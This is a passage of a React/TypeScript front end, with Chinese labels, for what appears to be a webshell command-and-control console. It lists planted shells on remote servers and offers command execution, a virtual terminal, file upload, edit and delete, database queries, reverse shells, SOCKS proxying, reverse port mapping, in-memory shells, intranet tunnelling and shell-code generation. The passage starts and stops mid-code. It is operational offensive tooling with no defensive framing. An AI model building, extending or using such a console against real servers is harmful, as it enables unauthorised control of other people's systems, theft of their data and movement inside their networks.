        addrPort: bshellSelected, data: btoa(unescape(encodeURIComponent(line))),
      })
      await new Promise(r => setTimeout(r, 200))
      const res = await enginePost<{ ok: boolean; data?: string }>(
        CAP, `/shells/${selected.id}/bshell/read`, { addrPort: bshellSelected }
      )
      if (res.ok && res.data) setBshellOutput(prev => prev + decodeURIComponent(escape(atob(res.data!))))
    } catch (e: any) { setBshellOutput(prev => prev + `[错误] ${e.message}\n`) }
  }

  async function refreshBshellOutput() {
    if (!selected || !bshellSelected) return
    try {
      const res = await enginePost<{ ok: boolean; data?: string }>(
        CAP, `/shells/${selected.id}/bshell/read`, { addrPort: bshellSelected }
      )
      if (res.ok && res.data) setBshellOutput(prev => prev + decodeURIComponent(escape(atob(res.data!))))
    } catch (_) {}
  }

  // ── ReversePortMap ───────────────────────────────────────────────────────────

  async function startRevPortMap() {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/revportmap/create`, { port: parseInt(rpmPort) }
      )
      if (!res.ok) { alert(`创建失败: ${res.error}`); return }
      setRpmOutput('[等待内网连接…]\n')
      if (rpmPollRef.current) clearInterval(rpmPollRef.current)
      rpmPollRef.current = setInterval(async () => {
        try {
          const r = await enginePost<{ ok: boolean; sessions?: string[] }>(
            CAP, `/shells/${selected.id}/revportmap/list`, {}
          )
          if (r.ok) setRpmSessions(r.sessions ?? [])
        } catch (_) {}
      }, 2000)
    } catch (e: any) { alert(e.message) }
  }

  async function stopRevPortMap() {
    if (!selected) return
    try { await enginePost(CAP, `/shells/${selected.id}/revportmap/stop`, { port: parseInt(rpmPort) }) } catch (_) {}
    if (rpmPollRef.current) { clearInterval(rpmPollRef.current); rpmPollRef.current = null }
    setRpmSessions([])
  }

  async function rpmSend() {
    if (!selected || !rpmSelected || !rpmInput) return
    const line = rpmInput
    setRpmInput('')
    try {
      await enginePost(CAP, `/shells/${selected.id}/revportmap/write`, {
        sessionKey: rpmSelected, data: btoa(unescape(encodeURIComponent(line))),
      })
      await new Promise(r => setTimeout(r, 200))
      const res = await enginePost<{ ok: boolean; data?: string }>(
        CAP, `/shells/${selected.id}/revportmap/read`, { sessionKey: rpmSelected }
      )
      if (res.ok && res.data) setRpmOutput(prev => prev + decodeURIComponent(escape(atob(res.data!))))
    } catch (e: any) { setRpmOutput(prev => prev + `[错误] ${e.message}\n`) }
  }

  // ── Shell 管理 ──────────────────────────────────────────────────────────

  async function addShell() {
    if (!form.url.trim()) return
    setAdding(true)
    try {
      const res = await enginePost<{ id: string }>(CAP, '/shells', form)
      setAddOpen(false)
      setForm({ url: '', shellType: 'php', protocol: 'default_aes', customHeaders: '', password: 'aegis', note: '' })
      await loadShells(res.id)
      setTab('code')
    } catch (e: any) { alert(`添加失败: ${e.message}`) }
    finally { setAdding(false) }
  }

  async function deleteShell(sh: Shell) {
    if (!confirm(`确认删除 Shell: ${sh.url}?`)) return
    try {
      await engineRequest(CAP, `/shells/${sh.id}`, { method: 'DELETE' })
      if (selected?.id === sh.id) { setSelected(null) }
      await loadShells()
    } catch (e: any) { alert(`删除失败: ${e.message}`) }
  }

  async function saveNote() {
    if (!selected) return
    try {
      await engineRequest(CAP, `/shells/${selected.id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ note: noteText }),
      })
      setSelected(s => s ? { ...s, note: noteText } : s)
      setEditNote(false)
      await loadShells()
    } catch (e: any) { alert(`保存备注失败: ${e.message}`) }
  }

  // ── 渲染 ────────────────────────────────────────────────────────────────

  const tabs: { key: Tab; icon: React.ReactNode; label: string }[] = [
    { key: 'info',      icon: <Server size={12} />,          label: '基本信息' },
    { key: 'code',      icon: <Code2 size={12} />,           label: '获取Shell' },
    { key: 'cmd',       icon: <Terminal size={12} />,        label: '命令执行' },
    { key: 'vterm',     icon: <Zap size={12} />,             label: '虚拟终端' },
    { key: 'files',     icon: <FolderOpen size={12} />,      label: '文件管理' },
    { key: 'db',        icon: <Database size={12} />,        label: '数据库' },
    { key: 'rshell',    icon: <Send size={12} />,            label: '反弹Shell' },
    { key: 'socks',     icon: <Globe size={12} />,           label: 'SOCKS代理' },
    { key: 'portmap',   icon: <Network size={12} />,         label: '端口映射' },
    { key: 'memshell',  icon: <Cpu size={12} />,             label: '内存马' },
    { key: 'plugin',    icon: <Plug size={12} />,            label: '插件' },
    { key: 'eval',      icon: <FileCode size={12} />,        label: '代码执行' },
    { key: 'transfer',  icon: <ArrowLeftRight size={12} />,  label: '内网穿透' },
    { key: 'bshell',    icon: <Radio size={12} />,           label: 'BShell' },
    { key: 'revportmap',icon: <ArrowLeftRight size={12} />,  label: '反向端口映射' },
  ]

  return (
    <div className="flex h-full gap-0 animate-fade-in" style={{ height: 'calc(100vh - 112px)' }}>

      {/* ── 左侧 Shell 列表 ── */}
      <div className="w-68 flex-shrink-0 flex flex-col border-r border-line" style={{ width: 256 }}>
        <div className="flex items-center justify-between px-3 py-2.5 border-b border-line">
          <span className="flex items-center gap-1.5 text-sm font-medium text-slate-200">
            <Shield size={14} className="text-cyber" /> Webshell ({shells.length})
          </span>
          <div className="flex items-center gap-1">
            <button onClick={() => setCodeGenOpen(true)}
              title="生成 Shell 代码（无需已有连接）"
              className="flex items-center gap-1 rounded border border-line px-2 py-1 text-[11px] text-slate-400 hover:border-cyber/40 hover:text-cyber">
              <Code2 size={11} /> 生成
            </button>
            <button onClick={() => setAddOpen(true)}
              className="flex items-center gap-1 rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-[11px] text-cyber hover:bg-cyber/20">
              <Plus size={11} /> 添加
            </button>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto">
          {loading ? (
            <div className="p-4 text-center text-xs text-slate-500">加载中…</div>
          ) : shells.length === 0 ? (
            <div className="p-6 text-center">
              <Shield size={28} className="mx-auto mb-2 text-slate-700" />
              <p className="text-xs text-slate-500">暂无 Shell</p>
            </div>
          ) : shells.map(sh => {
            const isSel = selected?.id === sh.id
            return (
              <button key={sh.id} onClick={() => { setSelected(sh); setTab('info') }}
                className={`w-full text-left px-3 py-2.5 border-b border-line/50 transition-colors ${isSel ? 'bg-cyber/8 border-l-2 border-l-cyber' : 'hover:bg-base-700/40'}`}>
                <div className="flex items-center gap-1.5 mb-1">
                  <span className={`h-1.5 w-1.5 rounded-full flex-shrink-0 ${sh.status === 'online' ? 'bg-emerald-400 animate-pulse' : sh.status === 'offline' ? 'bg-red-400' : 'bg-slate-600'}`} />
                  <span className={`chip border text-[10px] ${TYPE_COLORS[sh.shellType] ?? 'text-slate-400 bg-slate-400/10 border-slate-400/30'}`}>
                    {sh.shellType.toUpperCase()}
                  </span>
                  <span className="chip border text-[10px] text-purple-400 bg-purple-400/10 border-purple-400/30">
                    {PROTOCOL_LABELS[sh.protocol] ?? sh.protocol}
                  </span>
                  <span className="text-[10px] text-slate-600 ml-auto flex-shrink-0">
                    {sh.status === 'online' ? '在线' : sh.status === 'offline' ? '离线' : '未知'}
                  </span>
                </div>
                <div className="font-mono text-[11px] text-slate-300 truncate">{sh.url}</div>
                {sh.runUser && (
                  <div className="text-[10px] text-slate-500 mt-0.5 truncate">{sh.runUser}@{sh.hostname}</div>
                )}
                {sh.note && <div className="text-[10px] text-slate-600 truncate italic">{sh.note}</div>}
              </button>
            )
          })}
        </div>

        <div className="px-3 py-2 border-t border-line">
          <button onClick={() => loadShells()} className="flex items-center gap-1.5 text-[11px] text-slate-500 hover:text-slate-300">
            <RefreshCw size={10} /> 刷新列表
          </button>
        </div>
      </div>

      {/* ── 右侧操作区 ── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {!selected ? (
          <div className="flex-1 flex items-center justify-center">
            <div className="text-center">
              <Terminal size={48} className="mx-auto mb-3 text-slate-700" />
              <p className="text-slate-500">选择左侧 Shell 开始操作</p>
            </div>
          </div>
        ) : (
          <>
            {/* Shell 信息栏 */}
            <div className="flex items-center justify-between px-3 py-2 border-b border-line bg-base-800/40 flex-shrink-0">
              <div className="flex items-center gap-2 min-w-0">
                <span className={`h-2 w-2 rounded-full flex-shrink-0 ${selected.status === 'online' ? 'bg-emerald-400 animate-pulse' : selected.status === 'offline' ? 'bg-red-400' : 'bg-slate-500'}`} />
                <span className="font-mono text-xs text-slate-200 truncate">{selected.url}</span>
                <span className={`chip border text-[10px] flex-shrink-0 ${TYPE_COLORS[selected.shellType] ?? 'text-slate-400 bg-slate-400/10 border-slate-400/30'}`}>
                  {selected.shellType.toUpperCase()}
                </span>
                <span className="chip border text-[10px] flex-shrink-0 text-purple-400 bg-purple-400/10 border-purple-400/30">
                  {PROTOCOL_LABELS[selected.protocol] ?? selected.protocol}
                </span>
              </div>
              <div className="flex items-center gap-1.5 flex-shrink-0">
                {JSP_ASPX_PARTIAL.has(selected.shellType) ? (
                  <>
                    <span className="flex items-center gap-1 text-[10px] text-amber-400/70 border border-amber-400/20 bg-amber-400/5 rounded px-2 py-1">
                      <AlertCircle size={10} /> 字节码开发中
                    </span>
                    <button onClick={() => setTab('code')}
                      className="flex items-center gap-1 rounded border border-cyber/30 bg-cyber/5 px-2 py-1 text-[11px] text-cyber/80 hover:bg-cyber/10 hover:text-cyber">
                      <Code2 size={11} /> 查看Shell代码
                    </button>
                  </>
                ) : ACTIVE_TYPES.has(selected.shellType) ? (
                  <button onClick={() => connectShell(selected)} disabled={connecting}
                    className={`flex items-center gap-1 rounded border px-2 py-1 text-[11px] transition ${connecting ? 'border-line text-slate-500 cursor-wait' : 'border-cyber/40 bg-cyber/10 text-cyber hover:bg-cyber/20'}`}>
                    {connecting ? <RefreshCw size={11} className="animate-spin" /> : <Wifi size={11} />}
                    {connecting ? '连接中…' : '连接/刷新'}
                  </button>
                ) : null}
                <button onClick={() => { setNoteText(selected.note || ''); setEditNote(true) }}
                  className="p-1 rounded hover:bg-base-600/50 text-slate-500 hover:text-slate-300">
                  <Edit3 size={13} />
                </button>
                <button onClick={() => deleteShell(selected)}
                  className="flex items-center gap-1 rounded border border-red-400/30 bg-red-400/10 px-2 py-1 text-[11px] text-red-400 hover:bg-red-400/20">
                  <Trash2 size={11} /> 删除
                </button>
              </div>
            </div>

            {/* Tab 栏 */}
            <div className="flex gap-0 border-b border-line flex-shrink-0 overflow-x-auto">
              {tabs.map(({ key, icon, label }) => {
                const caps = selected ? SHELL_TAB_CAPS[selected.shellType] : null
                const disabled = caps != null && !caps.has(key)
                return (
                  <button key={key}
                    onClick={() => !disabled && setTab(key)}
                    disabled={disabled}
                    title={disabled ? `${selected?.shellType?.toUpperCase()} 不支持此功能` : undefined}
                    className={`flex items-center gap-1 px-3 py-2 text-[11px] whitespace-nowrap border-b-2 transition-colors
                      ${disabled ? 'border-transparent text-slate-700 cursor-not-allowed opacity-40' :
                        tab === key ? 'border-cyber text-cyber' : 'border-transparent text-slate-500 hover:text-slate-300'}`}>
                    {icon} {label}
                  </button>
                )
              })}
            </div>

            {/* Tab 内容 */}
            <div className="flex-1 overflow-hidden">

              {/* ── 基本信息 ── */}
              {tab === 'info' && (
                <div className="p-4 overflow-y-auto h-full">
                  {selected.status !== 'online' ? (
                    <div className="flex flex-col items-center justify-center h-40 text-center gap-2">
                      <AlertCircle size={32} className="text-slate-600 mb-1" />
                      {JSP_ASPX_PARTIAL.has(selected.shellType) ? (
                        <>
                          <p className="text-slate-300 text-sm">{selected.shellType.toUpperCase()} Shell 已添加</p>
                          <p className="text-xs text-slate-500">传输协议已实现，主动连接（命令/文件）需预编译字节码，开发中</p>
                          <button onClick={() => setTab('code')}
                            className="mt-1 flex items-center gap-1.5 rounded border border-cyber/40 bg-cyber/10 px-4 py-1.5 text-xs text-cyber hover:bg-cyber/20">
                            <Code2 size={12} /> 查看 Shell 部署代码
                          </button>
                        </>
                      ) : (
                        <>
                          <p className="text-slate-500 text-sm">Shell 未连接</p>
                          {ACTIVE_TYPES.has(selected.shellType) && (
                            <button onClick={() => connectShell(selected)}
                              className="rounded border border-cyber/40 bg-cyber/10 px-4 py-1.5 text-xs text-cyber hover:bg-cyber/20">
                              立即连接
                            </button>
                          )}
                        </>
                      )}
                    </div>
                  ) : (
                    <div className="space-y-3">
                      <div className="grid grid-cols-2 gap-2">
                        {[
                          { label: '操作系统',   value: selected.osInfo || '—' },
                          { label: 'Web 服务器', value: selected.serverInfo || '—' },
                          { label: 'PHP 版本',   value: selected.phpVersion || '—' },
                          { label: '运行用户',   value: selected.runUser || '—' },
                          { label: '主机名',     value: selected.hostname || '—' },
                          { label: '服务器 IP',  value: selected.serverIp || '—' },
                          { label: '当前目录',   value: selected.cwd || '—' },
                          { label: '最后连接',   value: selected.lastSeen ?? '—' },
                        ].map(({ label, value }) => (
                          <div key={label} className="rounded border border-line bg-base-700/30 p-2.5">
                            <div className="text-[10px] text-slate-500 mb-1">{label}</div>
                            <div className="font-mono text-xs text-slate-200 break-all">{value}</div>
                          </div>
                        ))}
                      </div>
                      <div className="rounded border border-line bg-base-700/30 p-2.5">
                        <div className="text-[10px] text-slate-500 mb-1">Shell URL</div>
                        <div className="font-mono text-xs text-slate-200 break-all">{selected.url}</div>
                      </div>
                      {selected.note && (
                        <div className="rounded border border-amber-400/20 bg-amber-400/5 p-2.5">
                          <div className="text-[10px] text-amber-400/70 mb-1">备注</div>
                          <div className="text-xs text-slate-300">{selected.note}</div>
                        </div>
                      )}
                      <div className="flex gap-2">
                        <button onClick={() => { setTab('files'); listDir(selected.cwd || '/') }}
                          className="flex items-center gap-1.5 rounded border border-line px-3 py-1.5 text-xs text-slate-400 hover:text-slate-200">
                          <FolderOpen size={12} /> 打开文件管理
                        </button>
                        <button onClick={() => setTab('cmd')}
                          className="flex items-center gap-1.5 rounded border border-line px-3 py-1.5 text-xs text-slate-400 hover:text-slate-200">
                          <Terminal size={12} /> 打开命令终端
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {/* ── 命令执行 ── */}
              {tab === 'cmd' && (
                <div className="flex flex-col h-full">
                  <div className="flex flex-wrap gap-1 px-3 py-2 border-b border-line flex-shrink-0">
                    {PRESET_CMDS.map(c => (
                      <button key={c} onClick={() => runCmd(c)}
                        disabled={selected.status !== 'online' || execing}
                        className="rounded border border-line bg-base-700/40 px-2 py-0.5 font-mono text-[10px] text-slate-400 hover:border-cyber/30 hover:text-cyber disabled:opacity-40">
                        {c}
                      </button>
                    ))}
                    <button onClick={() => setTermLines([])}
                      className="ml-auto rounded border border-line px-2 py-0.5 text-[10px] text-slate-500 hover:text-slate-300">
                      清空
                    </button>
                  </div>
                  <div ref={termRef} className="flex-1 overflow-y-auto p-4 font-mono text-xs leading-relaxed bg-black/50">
                    {termLines.length === 0 && (
                      <div className="text-slate-600">
                        {selected.status === 'online' ? '// 输入命令或点击快捷按钮' : '// 请先连接 Shell'}
                      </div>
                    )}
                    {termLines.map((line, i) => (
                      <div key={i} className={
                        line.type === 'input' ? 'text-cyber' :
                        line.type === 'error' ? 'text-red-400' :
                        line.type === 'system' ? 'text-amber-400' : 'text-slate-300'
                      }>{line.text}</div>
                    ))}
                    {execing && <div className="text-slate-500 animate-pulse">▌</div>}
                  </div>
                  <form onSubmit={e => { e.preventDefault(); runCmd(cmd) }}
                    className="flex items-center gap-2 px-3 py-2 border-t border-line bg-base-900/60 flex-shrink-0">
                    <span className="font-mono text-[11px] text-slate-500 flex-shrink-0">
                      [{selected.runUser || 'shell'}@{selected.hostname || 'target'}]$
                    </span>
                    <input value={cmd} onChange={e => setCmd(e.target.value)}
                      onKeyDown={handleCmdKey}
                      disabled={selected.status !== 'online' || execing}
                      placeholder={selected.status === 'online' ? '输入命令（↑↓历史）…' : '请先连接 Shell'}
                      className="flex-1 bg-transparent font-mono text-xs text-slate-200 outline-none placeholder:text-slate-600 disabled:opacity-50" />
                    <button type="submit" disabled={selected.status !== 'online' || execing || !cmd.trim()}
                      className="rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-cyber hover:bg-cyber/20 disabled:opacity-40">
                      <ChevronRight size={14} />
                    </button>
                  </form>
                </div>
              )}

              {/* ── 虚拟终端 ── */}
              {tab === 'vterm' && (
                <div className="flex flex-col h-full">
                  {/* 控制栏 */}
                  <div className="flex items-center gap-2 px-3 py-2 border-b border-line flex-shrink-0 bg-base-800/30">
                    <input value={vtermShell} onChange={e => setVtermShell(e.target.value)}
                      disabled={vtermRunning}
                      placeholder="/bin/bash 或 cmd.exe"
                      className="flex-1 rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-[11px] text-slate-200 outline-none focus:border-cyber disabled:opacity-50" />
                    {!vtermRunning ? (
                      <button onClick={startVterm}
                        disabled={selected.status !== 'online'}
                        className="flex items-center gap-1 rounded border border-emerald-400/40 bg-emerald-400/10 px-3 py-1 text-xs text-emerald-400 hover:bg-emerald-400/20 disabled:opacity-40">
                        <Play size={11} /> 启动
                      </button>
                    ) : (
                      <button onClick={stopVterm}
                        className="flex items-center gap-1 rounded border border-red-400/40 bg-red-400/10 px-3 py-1 text-xs text-red-400 hover:bg-red-400/20">
                        <Square size={11} /> 停止
                      </button>
                    )}
                    <button onClick={() => setVtermOutput('')}
                      className="p-1 rounded hover:bg-base-600/50 text-slate-500 hover:text-slate-300">
                      <RotateCcw size={12} />
                    </button>
                    <span className={`text-[10px] font-mono ${vtermRunning ? 'text-emerald-400' : 'text-slate-600'}`}>
                      {vtermRunning ? '● 运行中' : '○ 未启动'}
                    </span>
                  </div>

                  {/* 输出区 */}
                  <div ref={vtermRef}
                    className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-relaxed bg-black/60 text-slate-300 whitespace-pre-wrap break-all"
                    onClick={() => document.getElementById('vterm-input')?.focus()}>
                    {vtermOutput || <span className="text-slate-600">{selected.status === 'online' ? '// 点击「启动」开始虚拟终端' : '// 请先连接 Shell'}</span>}
                  </div>

                  {/* 输入行 */}
                  <form onSubmit={e => { e.preventDefault(); sendVterm() }}
                    className="flex items-center gap-2 px-3 py-2 border-t border-line bg-base-900/60 flex-shrink-0">
                    <span className="text-slate-600 font-mono text-xs flex-shrink-0">{'>'}</span>
                    <input id="vterm-input" value={vtermInput}
                      onChange={e => setVtermInput(e.target.value)}
                      disabled={!vtermRunning}
                      placeholder={vtermRunning ? '输入命令（回车发送）…' : '请先启动虚拟终端'}
                      className="flex-1 bg-transparent font-mono text-xs text-slate-200 outline-none placeholder:text-slate-600 disabled:opacity-50" />
                    <button type="submit" disabled={!vtermRunning || !vtermInput}
                      className="rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-cyber hover:bg-cyber/20 disabled:opacity-40">
                      <ChevronRight size={14} />
                    </button>
                  </form>
                </div>
              )}

              {/* ── 文件管理 ── */}
              {tab === 'files' && (
                <div className="flex flex-col h-full">
                  {/* 路径栏 */}
                  <div className="flex items-center gap-1.5 px-3 py-2 border-b border-line flex-shrink-0 bg-base-800/30">
                    <button onClick={navigateBack} disabled={pathHistory.length <= 1}
                      className="p-1 rounded hover:bg-base-600/50 disabled:opacity-30">
                      <ArrowLeft size={13} className="text-slate-400" />
                    </button>
                    <span className="font-mono text-[11px] text-slate-300 flex-1 truncate">{filePath}</span>
                    <button onClick={() => listDir(filePath)} disabled={loadingFiles}
                      className="p-1 rounded hover:bg-base-600/50">
                      <RefreshCw size={12} className={`text-slate-400 ${loadingFiles ? 'animate-spin' : ''}`} />
                    </button>
                    {selected.status === 'online' && (
                      <>
                        <button onClick={() => setShowMkdir(true)}
                          className="flex items-center gap-1 rounded border border-line px-1.5 py-0.5 text-[10px] text-slate-400 hover:text-slate-200">
                          <FolderPlus size={10} /> 新建目录
                        </button>
                        <button onClick={() => uploadRef.current?.click()}
                          className="flex items-center gap-1 rounded border border-line px-1.5 py-0.5 text-[10px] text-slate-400 hover:text-slate-200">
                          <Upload size={10} /> 上传
                        </button>
                        <input ref={uploadRef} type="file" className="hidden" onChange={uploadFile} />
                      </>
                    )}
                    {selected.status === 'online' && files.length === 0 && !loadingFiles && (
                      <button onClick={() => listDir(selected.cwd || '/')}
                        className="rounded border border-cyber/40 bg-cyber/10 px-2 py-0.5 text-[10px] text-cyber">
                        加载目录
                      </button>
                    )}
                  </div>

                  {/* 新建目录行 */}
                  {showMkdir && (
                    <div className="flex items-center gap-2 px-3 py-1.5 border-b border-line bg-base-800/20 flex-shrink-0">
                      <span className="text-[10px] text-slate-500">新目录名：</span>
                      <input autoFocus value={mkdirName} onChange={e => setMkdirName(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter') doMkdir(); if (e.key === 'Escape') setShowMkdir(false) }}
                        className="flex-1 rounded border border-line bg-base-700/60 px-2 py-0.5 text-xs text-slate-200 outline-none focus:border-cyber" />
                      <button onClick={doMkdir} className="text-[10px] text-cyber hover:text-cyber/80">确定</button>
                      <button onClick={() => { setShowMkdir(false); setMkdirName('') }}
                        className="text-[10px] text-slate-500 hover:text-slate-300">取消</button>
                    </div>
                  )}

                  {editFile ? (
                    <div className="flex flex-col flex-1 overflow-hidden">
                      <div className="flex items-center justify-between px-3 py-2 border-b border-line flex-shrink-0">
                        <span className="font-mono text-[11px] text-slate-300 truncate">{editFile.path}</span>
                        <div className="flex gap-1.5">
                          <button onClick={saveFile}
                            className="rounded border border-cyber/40 bg-cyber/10 px-2 py-1 text-xs text-cyber hover:bg-cyber/20">
                            保存
                          </button>
                          <button onClick={() => setEditFile(null)}
                            className="rounded border border-line px-2 py-1 text-xs text-slate-400 hover:text-slate-200">
                            <X size={12} />
                          </button>
                        </div>
                      </div>
                      <textarea value={editFile.content}
                        onChange={e => setEditFile(f => f ? { ...f, content: e.target.value } : f)}
                        className="flex-1 resize-none bg-black/60 p-4 font-mono text-xs text-slate-200 outline-none" />
                    </div>
                  ) : renameItem ? (
                    <div className="flex items-center gap-2 px-3 py-2 border-b border-line bg-base-800/20 flex-shrink-0">
                      <span className="text-[10px] text-slate-500">重命名 "{renameItem.name}"：</span>
                      <input autoFocus value={renameNew} onChange={e => setRenameNew(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter') doRename(); if (e.key === 'Escape') setRenameItem(null) }}
                        className="flex-1 rounded border border-line bg-base-700/60 px-2 py-0.5 text-xs text-slate-200 outline-none focus:border-cyber" />
                      <button onClick={doRename} className="text-[10px] text-cyber">确定</button>
                      <button onClick={() => setRenameItem(null)} className="text-[10px] text-slate-500">取消</button>
                    </div>
                  ) : (
                    <div className="flex-1 overflow-y-auto">
                      {loadingFiles ? (
                        <div className="p-6 text-center text-xs text-slate-500">加载中…</div>
                      ) : files.length === 0 ? (
                        <div className="p-6 text-center text-xs text-slate-600">
                          {selected.status !== 'online' ? '请先连接 Shell' : '目录为空或点击「加载目录」'}
                        </div>
                      ) : (
                        <table className="w-full text-xs">
                          <thead>
                            <tr className="border-b border-line text-slate-500 text-[10px]">
                              <th className="text-left px-3 py-1.5 font-normal">名称</th>
                              <th className="text-right px-2 py-1.5 font-normal">大小</th>
                              <th className="text-right px-2 py-1.5 font-normal">修改时间</th>
                              <th className="text-center px-2 py-1.5 font-normal">权限</th>
                              <th className="px-2 py-1.5 w-20" />
                            </tr>
                          </thead>
                          <tbody>
                            {[...files]
                              .sort((a, b) => (b.isDir ? 1 : 0) - (a.isDir ? 1 : 0) || a.name.localeCompare(b.name))
                              .map(f => {
                                const fullPath = filePath.endsWith('/') ? filePath + f.name : filePath + '/' + f.name
                                return (
                                  <tr key={f.name} className="border-b border-line/30 hover:bg-base-700/20 group">
                                    <td className="px-3 py-1">
                                      <button onClick={() => f.isDir ? navigateTo(f.name) : readFile(fullPath)}
                                        className="flex items-center gap-1.5 text-slate-300 hover:text-slate-100">
                                        {f.isDir
                                          ? <Folder size={12} className="text-amber-400 flex-shrink-0" />
                                          : <File size={12} className="text-slate-500 flex-shrink-0" />}
                                        <span className="font-mono text-[11px]">{f.name}</span>
                                      </button>
                                    </td>
                                    <td className="px-2 py-1 text-right font-mono text-[10px] text-slate-500">
                                      {f.isDir ? '—' : fmtSize(f.size)}
                                    </td>
                                    <td className="px-2 py-1 text-right text-[10px] text-slate-500">{fmtTime(f.mtime)}</td>
                                    <td className="px-2 py-1 text-center font-mono text-[10px] text-slate-500">{f.perms}</td>
                                    <td className="px-2 py-1">
                                      <div className="hidden group-hover:flex items-center gap-1">
                                        {!f.isDir && (
                                          <>
                                            <button onClick={() => downloadFile(fullPath, f.name)} title="下载"
                                              className="text-sky-400/60 hover:text-sky-400">
                                              <Download size={11} />
                                            </button>
                                            <button onClick={() => getHash(fullPath)} title="MD5"
                                              className="text-amber-400/60 hover:text-amber-400">
                                              <Hash size={11} />
                                            </button>
                                          </>
                                        )}
                                        <button onClick={() => { setRenameItem({ path: fullPath, name: f.name }); setRenameNew(f.name) }} title="重命名"
                                          className="text-slate-400/60 hover:text-slate-300">
                                          <Edit3 size={11} />
                                        </button>
                                        <button onClick={() => deletePath(fullPath, f.name)} title="删除"
                                          className="text-red-400/60 hover:text-red-400">
                                          <Trash2 size={11} />
                                        </button>
                                      </div>
                                    </td>
                                  </tr>
                                )
                              })}
                          </tbody>
                        </table>
                      )}
                    </div>
                  )}
                </div>
              )}

              {/* ── 数据库 ── */}
              {tab === 'db' && (
                <div className="flex h-full">
                  {/* 左侧连接配置 */}
                  <div className="w-52 flex-shrink-0 border-r border-line p-3 space-y-2 overflow-y-auto">
                    <div className="text-[10px] text-slate-500 font-medium uppercase tracking-wide mb-1">数据库连接</div>
                    <div>
                      <label className="block text-[10px] text-slate-500 mb-0.5">类型</label>
                      <select value={dbType} onChange={e => handleDbTypeChange(e.target.value)}
                        className="w-full rounded border border-line bg-base-700/60 px-2 py-1 text-xs text-slate-200 outline-none focus:border-cyber">
                        <option value="mysql">MySQL</option>
                        <option value="postgresql">PostgreSQL</option>
                        <option value="sqlserver">SQL Server</option>
                        <option value="oracle">Oracle</option>
                        <option value="sqlite">SQLite</option>
                      </select>
                    </div>
                    {dbType !== 'sqlite' && (
                      <>
                        <div>
                          <label className="block text-[10px] text-slate-500 mb-0.5">主机</label>
                          <input value={dbHost} onChange={e => setDbHost(e.target.value)}
                            className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                        </div>
                        <div>
                          <label className="block text-[10px] text-slate-500 mb-0.5">端口</label>
                          <input value={dbPort} onChange={e => setDbPort(e.target.value)}
                            className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                        </div>
                        <div>
                          <label className="block text-[10px] text-slate-500 mb-0.5">用户名</label>
                          <input value={dbUser} onChange={e => setDbUser(e.target.value)}
                            className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                        </div>
                        <div>
                          <label className="block text-[10px] text-slate-500 mb-0.5">密码</label>
                          <input type="password" value={dbPass} onChange={e => setDbPass(e.target.value)}
                            className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                        </div>
                      </>
                    )}
                    <div>
                      <label className="block text-[10px] text-slate-500 mb-0.5">
                        {dbType === 'sqlite' ? '数据库文件路径' : '数据库名'}
                      </label>
                      <input value={dbName} onChange={e => setDbName(e.target.value)}
                        placeholder={dbType === 'sqlite' ? '/path/to/db.sqlite' : ''}
                        className="w-full rounded border border-line bg-base-700/60 px-2 py-1 font-mono text-xs text-slate-200 outline-none focus:border-cyber" />
                    </div>
                    {/* 快捷SQL */}
                    <div className="pt-1">
                      <div className="text-[10px] text-slate-500 mb-1">快捷查询</div>
                      {['SELECT 1', 'SHOW DATABASES', 'SHOW TABLES', 'SELECT user()'].map(q => (
                        <button key={q} onClick={() => setDbSQL(q)}
                          className="block w-full text-left font-mono text-[10px] text-slate-500 hover:text-slate-300 py-0.5 truncate">
                          {q}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* 右侧查询区 */}
                  <div className="flex-1 flex flex-col overflow-hidden">
                    <div className="flex items-center gap-2 px-3 py-2 border-b border-line flex-shrink-0">
                      <textarea value={dbSQL} onChange={e => setDbSQL(e.target.value)}
                        rows={3}
                        className="flex-1 resize-none rounded border border-line bg-base-800/60 px-2 py-1.5 font-mono text-xs text-slate-200 outline-none focus:border-cyber"
                        placeholder="SELECT * FROM table LIMIT 100" />
                      <button onClick={runDBQuery}
                        disabled={dbRunning || selected.status !== 'online'}
                        className="flex-shrink-0 flex items-center gap-1.5 rounded border border-cyber/40 bg-cyber/10 px-3 py-1.5 text-xs text-cyber hover:bg-cyber/20 disabled:opacity-40">
                        {dbRunning ? <RefreshCw size={12} className="animate-spin" /> : <Play size={12} />}
                        执行
                      </button>
                    </div>
                    <div className="flex-1 overflow-auto p-2">
                      {dbError && (
                        <div className="rounded border border-red-400/30 bg-red-400/5 p-3 text-xs text-red-400 font-mono">{dbError}</div>
                      )}
                      {dbResult && (
                        <table className="w-full text-xs border-collapse">
                          <thead>
                            <tr className="border-b border-line">
                              <th className="text-[10px] text-slate-600 text-right px-2 py-1 font-normal w-8">#</th>
                              {dbResult.headers.map((h, i) => (
                                <th key={i} className="text-left px-2 py-1 text-[10px] text-slate-400 font-normal border-r border-line/30">{h}</th>
                              ))}
                            </tr>
                          </thead>
                          <tbody>
                            {dbResult.rows.length === 0 ? (
                              <tr><td colSpan={dbResult.headers.length + 1} className="text-center py-4 text-xs text-slate-600">无结果</td></tr>
                            ) : dbResult.rows.map((row, ri) => (
                              <tr key={ri} className={`border-b border-line/20 ${ri % 2 === 0 ? '' : 'bg-base-700/10'}`}>
                                <td className="text-[10px] text-slate-600 text-right px-2 py-0.5">{ri + 1}</td>
                                {row.map((cell, ci) => (
